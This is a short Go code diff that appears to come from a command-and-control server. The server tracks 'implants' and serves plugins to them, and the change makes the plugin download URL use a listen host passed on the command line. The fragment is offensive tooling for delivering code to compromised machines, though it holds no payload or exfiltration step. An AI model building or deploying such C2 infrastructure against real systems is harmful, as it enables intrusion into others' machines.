@@ -37,6 +37,7 @@ type KnownPlugin struct {
 
 var implants = map[string]Implant{}
 var knownPlugins = map[string]string{}
+var listenHost string
 
 func CheckError(err error) {
 	if err != nil {
@@ -137,7 +138,7 @@ func postAddPluginToImplant(w http.ResponseWriter, r *http.Request) {
 	} else {
 		pluginToImplant := PluginFromC2{
 			PluginID:   RandomString(16),
-			PluginURL:  "http://localhost:3333/plugin/", //For now this is the only that is needed. Maybe change in the future
+			PluginURL:  listenHost + ":3333/plugin/", //For now this is the only that is needed. Maybe change in the future
 			PluginName: pluginName,
 		}
 		entry := implants[implantName]
@@ -148,6 +149,8 @@ func postAddPluginToImplant(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+	listenHost = os.Args[1]
+
 	http.HandleFunc("/", postHeartbeat)
 	http.HandleFunc("/plugin/", postPlugin)
 	http.HandleFunc("/addplugin/", postAddToKnownPlugins)
